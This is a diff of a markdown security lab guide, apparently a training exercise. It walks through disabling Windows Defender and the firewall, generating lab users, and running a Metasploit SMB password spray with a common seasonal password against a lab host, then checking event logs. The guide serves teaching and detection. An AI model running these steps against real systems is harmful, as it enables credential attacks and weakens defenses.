@@ -27,8 +27,9 @@ First things first, disable **Defender**. Open an instance of **Windows PowerShe
 
 <img width="42" height="36" alt="image" src="https://github.com/user-attachments/assets/65c951dd-aafc-402f-9fb3-4fed153fe74d" />
 
-
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 This will disable **Defender** for this session.
 
@@ -41,34 +42,43 @@ Let's get started by opening a **Command Prompt** terminal by clicking on the ic
 
 Let's first get our IP address for your Windows system.  We will be using this later.
 
-<pre>ipconfig</pre>
+```
+ipconfig
+```
 
 Next, let's make sure the firewall is down.  This will allow us to configure the system to match what many internal systems have.
 
 No firewall.....  So much for defense in depth.
 
-<pre>netsh advfirewall set allprofiles state off</pre>
+```
+netsh advfirewall set allprofiles state off
+```
 
 Once the terminal opens, navigate into the appropriate directory by running the following command:
 
-<pre>cd \IntroLabs</pre>
+```
+cd \IntroLabs
+```
 
 We need to run the batch file named **200-user-gen** 
 
 First, let's get an updated version:
 
-<pre>curl -o 200-user-gen.bat https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/200-user-gen.bat</pre>
+```
+curl -o 200-user-gen.bat https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/200-user-gen.bat
+```
 
 Now, we need to run it!
 
 Do so by typing the name of the batch file and hitting enter:
 
-<pre>200-user-gen.bat</pre>
+```
+.\200-user-gen.bat
+```
 
 It should look like this:
 
-<img width="980" height="410" alt="image" src="https://github.com/user-attachments/assets/a77f162f-2521-4de8-8f97-b091d9caca30" />
-
+<img width="907" height="463" alt="img01" src="https://github.com/user-attachments/assets/79b9eb59-e2eb-42e3-bf7d-6f738a3cfdbe" />
 
 Let this run all the way through. 
 
@@ -76,44 +86,55 @@ Let this run all the way through.
 
 Now we need to get our attack system ready,
 
-First, let’s start up a Kali instance:
+First, let’s start up an Ubuntu instance:
 
-<img width="81" height="75" alt="image" src="https://github.com/user-attachments/assets/15d9793c-15c8-498d-9b10-4a8303b92d62" />
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
 Next, let's become root:
 
-<pre>sudo su -</pre>
+```
+sudo su -
+```
 
 Now, let's get a user list:
 
-<pre>wget https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/users.txt
-</pre>
+```
+wget https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/users.txt
+```
 
 It should look like this:
 
-<img width="662" height="513" alt="image" src="https://github.com/user-attachments/assets/f6f654c5-ad2d-4c8f-b8da-22ccacebc2dc" />
-
+<img width="827" height="206" alt="img02" src="https://github.com/user-attachments/assets/bdd8e134-c52e-4de7-9e5f-133847c5e9d5" />
 
 Please note this list would be acquired by running recon on sites like LinkedIn and possibly a company directory.
 
 Now, let's start up and configure Metasploit for the remote attack!
 
-<pre>msfconsole -q</pre>
+```
+msfconsole -q
+```
 
-<pre>use auxiliary/scanner/smb/smb_login</pre>
+```
+use auxiliary/scanner/smb/smb_login
+```
 
-<pre>set RHOST 10.10.124.217</pre>
+```
+set RHOST 10.10.124.217
+```
 
-#Remember!! Your IP address will be different!!!!!
+**Remember!! Your IP address will be different!!!!!**
 
-<pre>set USER_FILE users.txt</pre>
+```
+set USER_FILE users.txt
+```
 
-<pre>set SMBPASS Winter2025</pre>
+```
+set SMBPASS Winter2025
+```
 
 It should look like this:
 
-<img width="663" height="323" alt="image" src="https://github.com/user-attachments/assets/85491c23-0eab-4f68-94ca-03f91529aa1b" />
-
+<img width="710" height="162" alt="img03" src="https://github.com/user-attachments/assets/9fab8c30-b07a-401d-82a1-170178243c9c" />
 
 But wait!!!! Before we run it we should clear the event logs so it is easier to see the attack!
 
@@ -129,21 +150,23 @@ When it asks you to clear, just Clear.  No need to save.
 
 Now, let's go back to the Kali system and run our attack.
 
-<pre>run</pre>
+```
+run
+```
 
 It should look like this:
 
-<img width="665" height="357" alt="image" src="https://github.com/user-attachments/assets/addee394-b49d-4163-b12b-f9108bddc5da" />
+<img width="601" height="374" alt="img04" src="https://github.com/user-attachments/assets/ebffe6b2-50a4-4ea3-a220-f8710207ab64" />
 
 Please look closer at the green successful login accounts.
 
-<img width="646" height="51" alt="image" src="https://github.com/user-attachments/assets/bc575759-db09-42bb-ab1d-7ddcdaf65c93" />
+<img width="656" height="88" alt="img05" src="https://github.com/user-attachments/assets/e641456f-3827-4fea-8aa4-3272e6db8346" />
 
 Are there any Administrator logins?
 
 Yes! There is!!
 
-<img width="655" height="36" alt="image" src="https://github.com/user-attachments/assets/0574f486-ad24-442e-bd7b-b2836cc10c39" />
+<img width="660" height="17" alt="img06" src="https://github.com/user-attachments/assets/391368b8-e70b-408a-99ba-624676297f7a" />
 
 Now, let's look at the logs back in the event viewer:
 
